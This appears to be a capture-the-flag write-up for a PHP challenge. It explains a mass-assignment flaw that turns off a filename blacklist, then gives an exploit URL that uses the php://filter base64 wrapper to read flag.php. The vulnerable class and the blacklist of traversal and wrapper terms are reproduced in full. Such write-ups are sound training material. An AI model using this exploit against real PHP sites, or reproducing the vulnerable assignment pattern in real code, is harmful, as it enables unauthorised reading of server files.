Philtered
============

You're given a PHP-based website with a file loading mechanism. On the surface, it looks like it only serves safe static pages such as `aboutus.txt` and `our-values.txt`. But behind the scenes, there's a mass assignment vulnerability that allows you to override internal configuration defined in the Config class, as well as some sensitive paths like `allow_unsafe`

---

## Discovery

You are given access to the source code (`index.php`), or it’s deployed at a URL like:

Checking the code will show the following, (I have added comments to explain whats going on)

```php
// Simple Config class that seems to only hold 2 values
class Config {
    public $path = 'information.txt';
    public $data_folder = 'data/';
}

// A file loader class used to load files
class FileLoader {
    public $config; // This will be set to the config object
    public $allow_unsafe = false; // Not allowing unsafe which is used to determine if checks are performed against the user provided values.
    public $blacklist = ['php', 'filter', 'flag', '..', 'etc', '/', '\\']; // Can't use any of these words in the path

    public function __construct() {
        $this->config = new Config();
    }

    public function contains_blacklisted_term($value) {
        // If its not allow_unsdafe then confirmt hat the data is good.
        if (!$this->allow_unsafe) {
            foreach ($this->blacklist as $term) {
                if (stripos($value, $term) !== false) {
                    return true;    
                }
            }
        }
        return false;
    }

    // Allows config etc changes with arrays, kinda like what prototype pollution might do, but less "deep" in the tree
    public function assign_props($input) {
        foreach ($input as $key => $value) {
            if (is_array($value) && isset($this->$key)) {
                foreach ($value as $subKey => $subValue) {
                    if (property_exists($this->$key, $subKey)) {
                        // Checks if the properly exists, and if it does then checks if its all good before setting it to the value
                        if ($this->contains_blacklisted_term($subValue)) {
                            $subValue = 'philtered.txt';
                        }
                        $this->$key->$subKey = $subValue;
                    }
                }
            } else if (property_exists($this, $key)) {
                // The blacklisted term needs to be checked for the current Class as well
                if ($this->contains_blacklisted_term($value)) {
                    $value = 'philtered.txt';
                }
                $this->$key = $value;
            }
        }
    }

    public function load() {
        $path = $this->config->path;
        if (!$this->allow_unsafe) {
            $path = $this->config->data_folder . $path;
        }
        return @file_get_contents($path);
    }
}
```

---

## Exploiting


There is a flag.php file, but does not contain HTML that will be rendered out on the page, instead it just contains a variable definition.

Checking the code, there are some interesting bits of code:

```php
$loader->assign_props($_GET); // Sets props, kinda like assigning a bunch of values for classes 
```

Allows you to override any public property in the `FileLoader` or nested `Config` class.

Checking the code, there is a blacklist for dangerous words that we will need to read the flag.php file:

```php
['php', 'filter', 'flag', '..', 'etc', '/', '\']
```

However, this is only applied if `allow_unsafe` is false.

The class has this:

```php
public $allow_unsafe = false;
```

If you override this via the mass assignment vuln and set `allow_unsafe=1`, the blacklist logic is entirely disabled.

Once the blacklist is disabled, you can load PHP stream wrappers, especially:

```php
php://filter/convert.base64-encode/resource=...
```

Which base64-encodes file contents.


## Exploit

Since the flag is in `flag.php`, it can be just encoded and printed:

```
http://localhost/index.php?allow_unsafe=1&config[data_folder]=php://filter/convert.base64-encode/resource=&config[path]=flag.php
```

This sets:

- `allow_unsafe = 1` — disables blacklist
- `data_folder = php://filter/convert.base64-encode/resource=`
- `path = flag.php`

So the final read is:

```php
file_get_contents('php://filter/convert.base64-encode/resource=flag.php');
```

Which returns the base64-encoded contents of `flag.php`.

The flag can then be base64 decoded.
